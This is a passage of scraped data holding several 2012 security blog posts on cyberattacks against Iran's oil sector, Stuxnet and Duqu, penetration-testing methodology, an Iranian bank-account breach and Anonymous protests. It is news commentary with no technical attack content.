It\u2019s clear that behind the attacks there is a defined strategy to mine the main sector of the country, and Oil sector is the most important. The Government of Teharan is involved in a cyber war with the United States and Israel, periodically it reports cyberattacks to its nuclear and industrial sectors, always declaring that minor damage were caused. Earlier this year, head of Iran\u2019s civil defense agency Gholam Reza Jalali said the energy sector of the country has been a main target of cyberattacks over last years.\n\n\n\nAs usual in similar case are circulating news not confirmed by the official sources. Many expert are convinced it is early to hazard hypothesis of connection with Stuxnet and Duqu. The first news related to the incident indicates that only the website of the oil ministry that was hit during the attacks and that not control systems was infected. If confirmed of course we can resize the impact of incident reformulating new hypotheses on its origin.\n\nJohn Bumgarner, a security specialist with the think tank U.S. Cyber Consequences Unit, declared to the Reuters Press that the purpose of similar malware is to attack the production processes erasing data and shutting down operations.\n\n\u201cThe reason you would put a virus inside this network to erase data is because that causes those facilities to have to shut down\u201d\n\nand to rebuild servers, he told Reuters.\n\n\u201cSo during that time the production and refinery operations for Iran could be impacted. And depending on how the virus was written, it could be longer term.\u201d\n\nIn the last months the Iran has been banned from the purchase of antivirus systems, a technological embargo with clear implications for the Stuxnet virus attacks and the need for the country to prevent further infections to industrial control systems for critical infrastructures. It was announced an international sanctions to stop the Government of Teheran from obtaining commercial anti-virus software, according to a senior Iranian intelligence official. The reply of Teharan was immediate, the announcement was been made public by FARS news agency, and Iranian Deputy National Security Minister for technical issues Ahangaran said the country is being forced to design its own anti-virus software due to the sanctions. Ahangaran said that Iran is unable update antivirus programs and combat Internet viruses because of the imposed ban.\n\nTo respond to the cyber attacks and with the intent to be more active in the cyber warfare Iran has recently announced a series of cyber defense measures spearheaded by the Revolutionary Guards, the unit which already runs every key military program in Iran and many industries.  All the strategic servers of the government moved inside the country and for them special protection measures have taken, the Revolutionary Guard in March also set up an hack-proof communications network for its high-level officials.  These are just last measures in order of times, we must consider that an emerging expertize in cyber warfare. Under Cyber warfare perspective we must consider Iranian expertise. During the protests after the disputed election in 2009 Iran has demonstrated to have the complete control of its cyberspace thanks the collaboration of western companies and to strategic alliance with technologic countries like China. The country is investing in cyber training program and in recruiting of young nationalist building a parallel covert cyber army already engaged to suppress domestic protest that could be easily employed like a cyber weapon against external enemies.\n\nThe Iranian Revolutionary Guards Corps, IRGC, seems to have built one of the largest forces of hackers on the planet. \u201cEmperor\u201d, \u201cIran Hackers Sabotage\u201d these are the names of the main group of hackers that during the last year have conducted several operation like destroy a government database or hack into two candidates\u2019 websites. during the 2005 presidential election. If in terms of cyber offense Iran has a considerable force not so it can be said of cyber defense strategy.\n\nObviously not all hacking groups in Iran are under government control, emblematic is the case of a group that managed to carry out a fraud to the detriment of some banks in the country for several million dollars.\n\nIn May 2010, Ebrahim Jabbari, a provincial Revolutionary Guards commander, declared that the IRGC had the world\u2019s second-largest cyber army at its disposal, the US intelligence is convinced of the potential of groups to the point of recognizing them as among the major cyber threats to the country.\n\nIn addition to cyber warriors and mercenaries, the Iran regime also has the control of the private IT firm Ashiyane Security Group, which has coordinated several cyber-attacks from Iran. Its illustrious victims are Mossad, Mossad, defence minister Ehud BarakNASA and several websites in the Arab world. It is clear in my opinion that the cyber strategy aimed against Iran by Western governments are continuing to undermine the nuclear weapons ambitions of Teheran.\n\nThe embargo, in addition to reinforcing the belief that the dangerous virus was indeed developed by Israeli agents and / or the U.S., suggests that these countries are focusing their efforts in prelude to a conventional military offensive against Iran.\n\nAre we also close to a military attacks against Iran?\n\nCertainly events like this might make us think that the event is close, but I believe that its strategy against the Iranian government does not provide urgently the option of a military attack. The situation is very complex and there are interests too high that involve nations like Russia and China.\n\nA possible U.S. or Israeli military attack could trigger a dangerous political situation with unpredictable consequences.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/antivirus", "topic_name": "antivirus"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/oil-industry", "topic_name": "Oil Industry"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tilded-platform", "topic_name": "Tilded Platform"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/worm", "topic_name": "worm"}]}, {"news_name": "Stuxnet & Duqu, update on cyber weapons usage", "news_link": "https://securityaffairs.co/wordpress/4544/hacking/stuxnet-duqu-update-on-cyber-weapons-usage.html", "title": "Stuxnet & Duqu, update on cyber weapons usage\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 19, 2012", "body": "We all know about the malware Stuxnet and Duqu considered unanimously the first examples of cyber weapon developed by a government to silent attacks critical enemy infrastructures. We have written a lot on the topic, we have followed with attention the excellent analysis made by experts of the sector such as Ralph Langner and the researchers of the Kaspersky and Symantec security firms; during last days new updates have been published on the web regarding the two agents trying to explain their status and the mode used to spread them behind the enemy line.\n\nLet\u2019s start with the update on the Stuxnet virus that was implanted to damage Iran\u2019s nuclear program. News of the days is that the operation was conducted by Israeli agents with the collaboration of Iranian spy, who used a corrupt \u201cmemory stick.32,\u201d to sabotage the nuclear plant of Natanz infecting machines there according to the declarations of a former and serving U.S. intelligence officials.\n\nIn the continuing battle to hold off the Iranian nuclear program, Iranian proxies have also been active in assassinating Iran\u2019s nuclear scientists, these sources said. Key figures of the operations seem to be groups of Iranian dissidents also involved the assassinating of Iran\u2019s nuclear scientists. Of course, the choice to use the human vector to spread the malware is to reach a more efficient diffusion of the virus avoiding it was discovered before to attack the target.\n\n\u201cThey said using a person on the ground would greatly increase the probability of computer infection, as opposed to passively waiting for the software to spread through the computer facility. \u2018Iranian double agents\u2019 would have helped to target the most vulnerable spots in the system.\u201d\n\nIran\u2019s intelligence suspected the infiltration of spies inside their plants and arrested an unspecified number of a person accused to have supported the operations related to the diffusion of the Stuxnet Virus.\n\nWho are the Iranian spies that have supported the Israeli operations?\n\nFormer and senior U.S. officials believe Iranian support belonged to the Mujahedeen-e-Khalq (People\u2019s Mujahedin of Iran, alias MEK, also PMOI, MKO).\n\nThe group is an exile-Iranian organization that advocates the overthrow of the Islamic Republic of Iran, founded in September 5, 1965 by a group of leftist Iranian university students as an Islamic and Marxist political mass movement. MEK was originally devoted to armed struggle against the Shah of Iran, capitalism, and Western imperialism, during the Iran-Iraq War, the group was given refuge by Saddam Hussein and mounted attacks on Iran from within Iraqi territory.  MEK is considered as the military wing of the National Council of Resistance of Iran (NCRI) and has targeted Iranian officials and government facilities in Iran and abroad.\n\nThe United States, Canada, Iraq and Iran consider the MEK a terrorist organization. On January 26, 2009, the Council of the European Union removed the MEK from the EU list of organizations it designates as terrorist and United States have received support for intelligence operations against the Iran\u2019s nuclear program in 2002 and 2008.\n\nThe report of  from Isssource.com says:\n\n\u201cFormer and senior U.S. officials believe nuclear spies belonged to the Mujahedeen-e-Khalq (MEK), which Israel uses to do targeted killings of Iranian nationals, they said. \u201cThe MEK is being used as the assassination arm of Israel\u2019s Mossad intelligence service,\u201d said Vince Cannistraro, former head of the CIA\u2019s Counterterrorism. He said the MEK is in charge of executing \u201cthe motor attacks on Iranian targets chosen by Israel. They go to Israel for training, and Israel pays them.\u201d Other former agency officials confirmed this.\u201d\n\nWe have always sustained the Israeli has worked close to US government and this is true in the specific campaign against Iranian nuclear program at least for the development of the cyber weapons, but  since 2007, five Iranian nuclear scientists have been killed in Iranian territory and the American forces seem to be extraneous to the facts, Israel has used as killer MEK spies well infiltrated in the foreign social context and with a deep knowledge of the activities performed inside the nuclear plants of Iran.\n\n\n\nStuxnet was discovered for the first time by Ukrainian firms VirusBlokAda based in Minsk, that was contacted by Iranian dealer that was having problem with several computers of its clients. Apparently, the computers were constantly turning off and restarting, but the antivirus was not able to detect the agents because Stuxnet used knowledge on zero-day vulnerabilities. Let\u2019s consider also the source code of the agent was also signed using digital certificates by Realtek Semiconductor and JMicron Technology Corp giving the appearance of legitimate software to Microsoft Windows.\n\nStuxnet was a perfect example of cyber weapon developed to surgical select its targets remaining uncovered and avoiding to infected not target machines. With Stuxnet was, in fact, introduced a new concept of malware, a broad-spectrum deadly weapon capable of hitting in a silent and surgical mode an high number of objectives located anywhere on the planet.\n\nThe researchers of the major antivirus companies have identified Stuxnet as the progenitor of another malware, Duqu, it also classified as a cyber weapon developed by a government commitment. Duqu is quite different from its relative, it has a modular structure like Stuxnet but it isn\u2019t equipped with modules for SCADA systems attack. It is only able to steal information from the host system.\n\nOn March 2012 a new instance of Duqu has been isolated in a variant designed to evade detection mechanism of antivirus products and other security systems, its the source code appears to be reshuffled and compiled with a different set of options and it also contains a different subroutine for decrypting the configuration block and loading the malware\u2019s body. A similar operation has been already observed in October 2011. Of course, also the references to C&C server are changed because all old structures were shut down on Oct. 20, 2011.\n\nDuqu is so still operating, in the last week, several instances are creating several in the Philippines where Duqu malware is infecting several computers spreading hidden in documents such as Microsoft Word files. The emergency is high according to Kaspersky Lab because the malware may begin to affect newly industrialized countries in Asia, including the Philippines that is one of the major IT outsourcing service providers.\n\n\u201cThe spread of Duqu in the Philippines could have dire effects on its multibillion-dollar outsourcing business,\u201d\n\nKaspersky Lab said in a statement.\n\nKaspersky\u2019s director of global research & analysis, Costin Raiu with his team, gathered evidence that shows that behind the Stuxnet and Duqu there is the same development team that has used a common platform to build the malware, but what is really interesting and new is that the researcher is convinced that the same framework has been also used to create at least three other pieces of malware.\n\nWe are dealing with an application that consists of several modules each responsible for a specific function to perform. The behavior of the malware to be produced is given by the way in which these modules are made to interact with the same agent. We are facing with a powerful a weapon for the following reasons:\n\nCostin Raiu said\n\n\u201cIt\u2019s like a Lego set. You can assemble the components into anything: a robot or a house or a tank,\u201d\n\nThe statement is the perfect synthesis of the key concept behind the new cyber weapons, just as with Lego you can dial any \u201cshape\u201d of malware assembling the individual components in a manner to be able to attack a specific target. Researchers with Kaspersky have named the platform \u201cTilded\u201d because many of the files in Duqu and Stuxnet have names beginning with the tilde symbol \u201c~\u201d and the letter \u201cd.\u201d\n\nLet\u2019s also consider that in the past malware have been already used for sabotage purpose and intelligence purposes, in the 1980s, the United States had considerable success installing viruses inside the Soviet military-industrial structure, a process still continuing with China.\n\n\u201cWe put in bugs inside the Soviet computers to feedback satellite information that had been \u2018leeched\u2019 off hard drives, in the Soviet Defense Ministry and others,\u201d said a former U.S. intelligence official.\n\nAlso during Desert Storm, the CIA and the British Government Communication Headquarters (GCHQ) have used malware agents to attack Iraq\u2019s computers deploying a Command & Control server in the enemy infrastructures. CIA operatives, working in Jordan, infiltrated bugs into hardware smuggled across the border and into Baghdad. In that occasion, the compromised devices weren\u2019t used due to the beginning US air strikes that destroyed Saddam\u2019s command and control network, including the buildings where the infected computer hardware was deployed.\n\nWhat we expect from the future?\n\nFor sure we will assist to the born of a new version of the existing agents equipped with more sophisticated modules that include new features and that are also able to avoid antivirus detection.\n\nWe will face with also the development of new malware based on the same platform and with the creation of new sophisticated platform used as malware factory.\n\nThe war is began!\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Duqu, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cia", "topic_name": "CIA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/digital-certificates", "topic_name": "digital certificates"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iranian-nuclear-program", "topic_name": "Iranian nuclear program"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sabotage", "topic_name": "Sabotage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tilded", "topic_name": "Tilded"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-day-vulnerabilities", "topic_name": "zero-day vulnerabilities"}]}, {"news_name": "Walk trough the penetration testing fundamentals", "news_link": "https://securityaffairs.co/wordpress/4524/hacking/walk-trough-the-penetration-testing-fundamentals.html", "title": "Walk trough the penetration testing fundamentals\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 18, 2012", "body": "The article is published on the last edition of Pentest Magazine. Enjoy the reading, the magazine is free and to download it you just have to create a free account on www.pentestmag.com.\n\n \n\nThe penetration testing is a fundamental method for the evaluation of the security level of a computer architecture or network that consists in the simulation of an attack to resources of the system under analysis. Of course the investigation can be conduced by experts to audit the security level of the target but also by cyber criminals that desire to exploit the system.\n\nThe penetration testing process is conducted over the target searching for any kind of vulnerabilities that could be exploited like software bugs, improper configurations, hardware flaws. The expertize provided by professional penetration testers is an irreplaceable component for the evaluation of the security of systems deployed in private and military sectors. In many sectors for the validation of any systems or component these kinds of test are requested.\n\nThe testing approach has radically changed over the years, similar tests were originally conducted mainly on systems already in production or operation in order to demonstrate their vulnerabilities, today\u2019s test sessions are planned as part of the design phase and assigned to internal or external staff in relation to the type of checks that are to be conducted.\n\nA first classification of penetration tests is made on the knowledge of the technical details regarding of the final target distinguishing Black box testing from White box testing. Black box testing assumes no prior knowledge of the system to test. The attacker has to first locate the target identifying its surface before starting the analysis. Whit the term of white box testing we identify an attacker with complete knowledge of the infrastructure to be tested.\n\nThe figure of the pen tester is a critical figure, he must think like an hacker paid to break our infrastructure and access the sensible information we possess, for this reason the choice of reliable and professional experts is crucial.  The risk to engaging the wrong professionals is high and it is also happened in the history that companies have wrongly hires hackers revealed in the time cyber criminals.  The information is power, is money and the concept of \u201ctrust\u201d is a fundamental for this kind of analysis.\n\nOver the years it has fortunately increased awareness of the risks attributable to vulnerabilities exploitable in systems and related economic impact, this aspect is not negligible because it has enabled a more robust commitment by management of companies that has requested more and more often penetration testing activities.\n\n\n\nAn effective penetration tests provides to the company a useful report on the status of their services and its exposure to the main threats known. Don\u2019t forget that many incidents registered last year were related to unknown vulnerabilities of the victims systems and misconfiguration of any kind of appliance.\n\nWhile the main objective of penetration testing is to determine security level of the company, and in particular of its infrastructures, it can have number of further objectives, including testing the organization\u2019s security incidents identification and response capability, testing security policy compliance and testing employee security awareness.\n\nMain benefits of a well done penetration testing are:\n\nAccording the principal methodologies the whole process of a penetration test, from initial requirements analysis to report generation, could be applied to the following areas:\n\n \n\nActivities of penetration testing are being object of regulation also by several standards, for example the Payment Card Industry Data Security Standard (PCI DSS), and security and auditing standard, requires both annual and ongoing penetration testing. The PCI DSS Requirement 11.3 addresses penetration testing like the attempts to exploit the vulnerabilities to determine whether unauthorized access or other malicious activity is possible.\n\nThe standard also include network and application layer testing as well as controls and processes around the networks and applications, and should occur from both outside the network trying to come in (external testing) and from inside the network.\n\nThe most important factor for a successfully penetration test is the adopted methodology that\u2019s the reason why the discipline is evolved starting its origin in 1970\u2019s. Professionals during the years have proposed and developed efficient frameworks for conducting a complete and accurate penetration test.\n\nThe Open Source Security Testing Methodology Manual (OSSTMM) by Pete Herzog has become a de-facto methodology for performing penetration testing and obtaining security metrics.\n\nPete Herzog, OSSTMM creator said :\u201cThe primary goal of the OSSTMM is to provide transparency. It provides transparency of those who have inadequate security configurations and policies. It provides transparency of those who perform inadequate security and penetration tests. It provides transparency of the unscrupulous security vendors vying to sponge up every last cent of their prey\u2019s already meager security budget; those who would side-step business values with over-hyped threats of legal compliance, cyber-terrorism, and hackers.\u201d\n\nIn main opinion transparency and an efficient methodology are essential for the study and the assessment of every system.\n\nJust to give a complete view on the standards and methodologies in penetration testing we can remind the others guidelines available worldwide recognized:\n\nHow effective are our system, how efficient are our processes? We never going to know until we run drills and exercises that stress out the platforms and perform the analysis. Simulate the possible attacks, measuring the level of response of our architecture is fundamental, we have learned by the events how dangerous an unpredicted incident could be.\n\nConducting a pen test is a good opportunity to test the level of security of an environment but also to evaluate the response of the company to an intrusion or to an incident. Using this methodology it is possible to stress and analyze a system or an application discovering its vulnerabilities and the impact of every possible attacks or malfunctions on the overall architecture and on related systems. It\u2019s happened that during a penetration test discovered mutual vulnerabilities between components, for example the exploit of a first Web service could cause the block or better an exploit in a related system that use the services provide.\n\nSeveral years ago, during the period I conducted penetration testing for a major company I observed during a test session that some components were intentionally excluded because the administrators of the platforms were informed regarding the vulnerabilities. That behavior it\u2019s really dangerous, excluding weak systems during a penetration test it\u2019s a common wrong practice that prevents an efficient analysis of the system.\n\nIn this way we will never be able to measure the impact of the vulnerabilities on the overall security despite how the risks are addressed and recognize by the management of a firm. In a past experience I have had the opportunity to audit a company ISO 27001 compliant, its management was perfectly aware regarding some known vulnerabilities accepting the related risks. Few months later, an external attack damaged the company due a vulnerability not known correlated to a well non problem not tested.\n\nIf the practice to carry out a penetration test is recognized and requested by the major standards that we examined in a private environment, it becomes crucial in critical environments such as military and government.\n\nIn these areas information management are extremely sensitive and it is essential for the environments to be tamper-resistant. For this reason, every device, component and infrastructure must be subjected to rigorous testing in time for the purpose of assessing the level of overall security. Particularly critical are all those heterogeneous environments where components are provided by different providers and whose iteration enables the delivery of services. It is this type of environment, together with those characterized by openness to the outside, are a real thorn in the side of management bodies as these architectures are more exposed to external threats.\n\nIn recent years there has been a dramatic growth of the attacks perpetrated against successful private companies and government agencies, a phenomenon in constant and growing concern.\n\nDemonstration projects conducted by groups of hacktivist like Anonymous, warfare operations conducted by foreign governments for purposes of offense and cyber espionage and an unprecedented increase of cyber criminal activities have attracted the attention to the security requirements of any IT solutions. The verification of the effectiveness of the solutions mentioned in defense has become a significant activity that has led to an increased demand of figures such as the penetration tester, which is multidisciplinary and multifaceted professional with the ability to analyze and study a system identifying its vulnerabilities.\n\nOf course in critical environment, like a military one, the governments due the secrecy of the solution analyzed have preferred to promote internal born group of experts trained to execute penetration test. In these  sector nations such as China, Russia and the US are at the forefront.\n\nAlso bring as example such systems within critical infrastructures, related vulnerabilities are alerting the security world community. The case of Stuxnet virus has taught the world how dangerous a cyber weapon capable of exploiting vulnerability in a system might be. The only possibility we have facing these cyber threats is to thoroughly test each individual component of the systems we are going to deploy. The method of soliciting such infrastructure through penetration tests is essential, unique opportunity to identify critical vulnerabilities that if exploited could affect their security posture.\n\nPenetration tests are a precious opportunity to protect our infrastructure that must be integrated in more articulated testing policies, a good example has been provided by the Special Publication 800-42, Guideline on Network Security Testing published by the National Institute of Standards and Technology (NIST), an agency of the U.S. Department of Commerce.\n\nLet me conclude with phrase that I\u2019ve read several time on the Web that resume the purpose of penetration test methodology:\n\n\u201cProtecting your enterprise by breaking it\u201d\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-criminals", "topic_name": "cyber criminals"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivist", "topic_name": "hacktivist"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/penetration-test", "topic_name": "penetration test"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/penetration-testing", "topic_name": "penetration testing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/vulnerabilities", "topic_name": "vulnerabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "Iran, 3M bank accounts hacked.Hypothesis on cyber warfare scenario", "news_link": "https://securityaffairs.co/wordpress/4499/cyber-crime/iran-3m-bank-accounts-hacked-hypothesis-on-cyber-warfare-scenario.html", "title": "Iran, 3M bank accounts hacked.Hypothesis on cyber warfare scenario\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 17, 2012", "body": "The story that I desire to report seems the plot of a movie, Khosrow Zarefarid an Iranian software manager after finding security vulnerability in Iran\u2019s banking system tried to inform the management of the affected banks preparing a detailed report. As usually the bank\u2019s manager ignored the alert so the Iranian expert decided to demonstrate the risk related to the discovered vulnerability, passing from theory to the action.\nHe hacked 3 million bank accounts, belonging to at least 22 different banks, to support his study. Admirable Zarefarid\u2019s intellectual honesty that is limited to hacking systems not stealing anything from the accounts, he has just exploited the vulnerability retrieving account details of around 3 million individuals, including card numbers and related PINs.\n\nZarefarid has worked at Eniak company which operates with the Interbank Information Transfer Network System (Shetab), an electronic banking clearance and automated payments system used in Iran. The Eniak is leader in Iran for providing payment systems, a crucial sector in the banking world, within it\u2019s activities there are also manufactoring and the installation of point of sales for the Iranian banking.\n\nWhat is really seriuos that in occasion of him first alert the expert provided details on the security flaw and also on 1000 bank account, but he was ignored, for this reason Zarefarid decided to make public the events.\n\nOf course the scenario is changed requesting the response of the banks, some Iranian banks such as Saderat, Eghtesad Novin have already started an informative campaign to inform their clients of the hack, inviing them to change their card PINs.  Other banks have preferred to block their customers\u2019s accounts to avoid any kind of problem, meanwhile the Central Bank of Iran (CBI) issued a statement announcing that millions of ATM cards have been hacked and inviting all card holders to change their PINs as soon as possible. The warning was repeated on state TV channels. Iran\u2019s Central Bank has announced that the electronic information of 3 million customers of 10 Iranian banks have been compromised.\n\n\n\n\nOther precautionary measure taken by some banks is the block of many ATMs for dispensing cash.\n\nWhat is really incredible of the event is the behaviour of the Central Bank of Iran is its position on the vulnerability discovered, it has confirmed that the threat is not serious and hasn\u2019t provided any information regarding its fix, let\u2019s remind in fact that the change of the PIN is a temporary solution for exposed accounts, but the hack could happen again is the right solution is not applied.\n\nMore details can be found on the expert\u2019s personal blog inside the post \u201cAre your bank card Between 3000000 these cards?\u201d\n\nAs usual let\u2019s make some reflections on the event, the vulnerability discovery raises serious questions about the security level of the bank infrastructure. According to Iran expert almost all of the banks are vulnerable to the hack demonstrated. Think for a moment what could happen if the same vulnerability was over in the wrong hands, be they cyber criminals, groups of hackers hired by foreign hostile governments or groups of hacktivists. The banking sector is a vital component of the infrastructure of a country, it is considered in every most meticulous cyber strategies as critical Infrastructure. Blockade of the banking system, hacking of payment systems on a large scale can be a catastrophe for any country, incalculable losses in terms of direct damage caused by theft of money and indirect damage related to the image of the company. The is also another worrysome aspect, a country attacked on its financial institution fails in the panic creating the right environment for other cyber and military operations, that is a typical cyber war scenario.\n\nObviously knowing the real answer to the incident of Iranian institutions is impossible, but judging by their focus on cyber warfare is expected kidnapped a government response for the resolution of the problem, even before the banking institutions. In a scenario like that of warfare the synergies between the sectors of a country and the strong commitment of the central government are preconditions for the implementation of a suitable and efficient cyber strategy.\n\nPierluigi Paganini\n\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/bank-accounts", "topic_name": "bank accounts"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/bank-infrastructure", "topic_name": "bank infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/banking", "topic_name": "banking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivists", "topic_name": "hacktivists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident", "topic_name": "Incident"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/vulnerability", "topic_name": "vulnerability"}]}, {"news_name": "Anonymous,from OpTrialAtHome to the streets,is time for changing", "news_link": "https://securityaffairs.co/wordpress/4351/cyber-crime/anonymousfrom-optrialathome-to-the-streetsis-time-for-changing.html", "title": "Anonymous,from OpTrialAtHome to the streets,is time for changing\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 15, 2012", "body": "Another Saturday, another round, as announced today the group Anonymous has targeted government sites to protest against British government policy. Nothing new over last week, same goals, same mode of attack, the same result. On internet bounced messages of joy for having staged the second act of the operation called by the group #OpTrialAtHome.\n\n\n\n\n\n \n\nLet\u2019s start making some reflections on the real utility of these operations once the message was passed last week. The operation has certainly achieved its goal in terms of media, on internet the news of the attacks is published everywhere, but in terms of offense they have little effect. The sites attacked were sites of representation and not operating web site in respect of services provided.\n\nTo make further unnecessary these attacks is the choice of days and hours of action, on a Saturday evening When nobody in the Government department concerned that their website is unavailable. Deliberate choice to minimize the impact of the offense or strategy for beginners?  Or another plausible hypothesis is that these operations, that are carried out without causing real side effects, are  organized by members infiltrated the group in order to bring out the actors of the protest in a context of reduced damage.\n\nHow long the group Anonymous will go on with this strategy, unable to cause serious damage to target infrastructures?\n\nThese attacks should lead us to some reflections, I think the group is a time of transition, despite having reached a critical mass of supporters began to split into numerous cells scattered throughout the world. For now, these cells appear to be driven by common goals, but what will happen tomorrow? In a heterogeneous scenario the risk that external agents can infiltrate the group influencing policy is concrete.  New operations can be organized in the name of the group with unpredictable consequences, foreign states or law enforcement may involve masses of people and convinced unaware hacktivist to conduct ideological battles. What guarantees the group can provide to its supporters? Will the group be able to capillary check any communication made globally with its brand? Of course not!\n\nI think for this reason that the group should change its strategy, is obliged to appear in new forms, probably in the future presented itself to the world with their representatives. The time of hiding, in the form of protest could begin to decline. The group is aware that its attacks may begin to serve to a third cause, not only its own.\n\nA few hours before the announced attack time, the default GCHQ (UK Government 